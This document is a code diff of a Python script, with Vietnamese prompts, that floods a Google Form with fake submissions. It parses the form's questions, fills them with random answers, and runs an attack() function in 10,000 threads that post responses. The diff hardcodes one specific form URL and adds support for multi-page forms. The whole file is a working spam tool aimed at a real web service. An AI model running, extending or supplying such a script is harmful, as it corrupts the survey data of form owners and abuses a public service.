@@ -1,11 +1,10 @@
-import re
 import string
 import random
 import requests
 import threading
 import tkinter as tk
 from tkinter import messagebox
-
+import re  # Thêm dòng này để import module re
 
 def random_string(n):
     chars = string.ascii_letters + string.digits
@@ -13,14 +12,10 @@ def random_string(n):
 
 s = requests.session()
 
-
 if __name__ == '__main__':
-    url_in = str(input("Nhập Link muốn Spam: ")).strip()
-    #url_in = str( prompt('Nhap Link: ')).strip()
-
-    #url_in = 'https://docs.google.com/forms/d/e/1FAIpQLSdij99or2kqhGneofj2945weO6UO2eOvQkChh879ZJXsJGAqA/viewform'
-    url = s.get(url_in).url
-    url_rsp = 'https://docs.google.com/forms/u/0/d/e/'+url.split('/')[-2]+'/formResponse'
+    url_in = 'https://docs.google.com/forms/d/e/1FAIpQLSdij99or2kqhGneofj2945weO6UO2eOvQkChh879ZJXsJGAqA/viewform'
+    url = s.get(url_in).url.split('/')[-2]
+    url_rsp = 'https://docs.google.com/forms/u/0/d/e/'+url+'/formResponse'
 
     contentext = s.get(url_rsp).text
     pram = "<title>(.*?)</title>"
@@ -36,48 +31,48 @@ if __name__ == '__main__':
     else:
         print("link lỗi !!!")
     max_spam = int(input("Nhập số lần muốn Spam: "))
-    pattern = r'data-params="%.@.(.*?)<span class'
 
-    dta ={}
-    cau_tra_loi ={}
-    matches = re.findall(pattern, contentext, re.DOTALL)
-    for mat in matches:
+    pattern = r',null,8,'
+    numpage = re.findall(pattern, contentext)
+    hstorypage = False
+    if len(numpage):
+        hstorypage = "0"
+        for i in range(1, len(numpage) + 1):
+            hstorypage += ',' + str(i)
 
-        mat = mat.split(']]')[0]
-        pattern = r',&quot;(.*?)&quot.*?\[\[(\d+)'
-        mattch = re.findall(pattern, mat)
-        cauhoi, id_q= mattch[0]
-        pattern = r"&quot;(.*?)&quot"
+    pattern = f'FB_PUBLIC_LOAD_DATA(.*?){url}'
+    dulieu = re.findall(pattern, contentext, re.DOTALL)[0]
+    pattern = "\[\d+,\"(.*?)\",null,(\d+)"
+    cauhoii = re.findall(pattern, dulieu, re.DOTALL)
 
-        cautraloi = re.findall(pattern, mat)[2:]
-        if "[false,true]" in mat:
-            ngay_thang_nam = True
-            dta['entry.' + id_q + '_year'] = "year"
-            dta['entry.' + id_q + '_month'] = "month"
-            dta['entry.' + id_q + '_day'] = "day"
-            # _year
-            # _month
-            # _day
-        elif ",[false]," in mat:
-            ngay_gio = True
-            dta['entry.' + id_q + '_hour'] = "hour"
-            dta['entry.' + id_q + '_minute'] = "minute"
-            # _hour:
-            # _minute
-        elif len(cautraloi) == 0:
-            dta['entry.' + id_q] = "No information!"
-        else:
-            dta['entry.'+id_q] = cautraloi
-
-        # print(id_q, data)
-        # print(mattch)
-        # input()
-    # print(dta)
+    pattern_Get_id = r'\[\[(\d+),'
+    pattern_get_cau_tl = r'\[\"(.*?)\"'
+    # print(dulieu)
     # input()
+    dta = {}
+    for (y, z) in cauhoii:
+        if int(z) != 8:
+            tltracno = dulieu.split(y)[1]
+            id_q = re.findall(pattern_Get_id, tltracno)[0]
+            if int(z) == 9:
+                ngay_thang_nam = True
+                dta['entry.' + id_q + '_year'] = "year"
+                dta['entry.' + id_q + '_month'] = "month"
+                dta['entry.' + id_q + '_day'] = "day"
+            elif int(z) == 10:
+                ngay_gio = True
+                dta['entry.' + id_q + '_hour'] = "hour"
+                dta['entry.' + id_q + '_minute'] = "minute"
+            elif int(z) == 0:
+                dta['entry.' + id_q] = "No information!"
+            else:
+                cautraloi = re.findall(pattern_get_cau_tl, tltracno.split(']]')[0])
+                dta['entry.' + id_q] = cautraloi
+
     def random_data():
         data_send = {}
+        global hstorypage
         for key, value in dta.items():
-
             if "year" in key:
                 value = int(random.randint(1890, 2077))
             elif "month" in key:
@@ -90,31 +85,24 @@ if __name__ == '__main__':
                 value = int(random.randint(1, 24))
             elif value != "No information!":
                 value = random.choice(value)
-
             data_send[key] = value
-            # print("key", key)
-            # print('value', value)
-
-        # print(data_send)
-        # input()
+        if hstorypage:
+            data_send['pageHistory'] = hstorypage
         return data_send
+
     def attack():
         global total_runs
         global max_spam
         if total_runs >= max_spam:
-            # print("Đã đạt đến số lần gửi tối đa. Dừng chương trình.")
-            return  # Dừng vòng lặp và kết thúc thread
+            return
         for _ in range(30):
             try:
                 if total_runs >= max_spam:
-                    #print("Đã đạt đến số lần gửi tối đa. Dừng chương trình.")
-                    return  # Dừng vòng lặp và kết thúc thread
+                    return
                 s.post(url_rsp,data=random_data())
                 total_runs += 1
-                #print(aa.text)
                 if total_runs >= max_spam:
-                    # print("Đã đạt đến số lần gửi tối đa. Dừng chương trình.")
-                    return  # Dừng vòng lặp và kết thúc thread
+                    return
                 if total_runs <= max_spam:
                     print(f"Đang gửi lần thứ: {total_runs}".center(50, '-'))
 
@@ -124,4 +112,3 @@ if __name__ == '__main__':
     total_runs = 0
     for _ in range(10000):
         threading.Thread(target=attack).start()
-
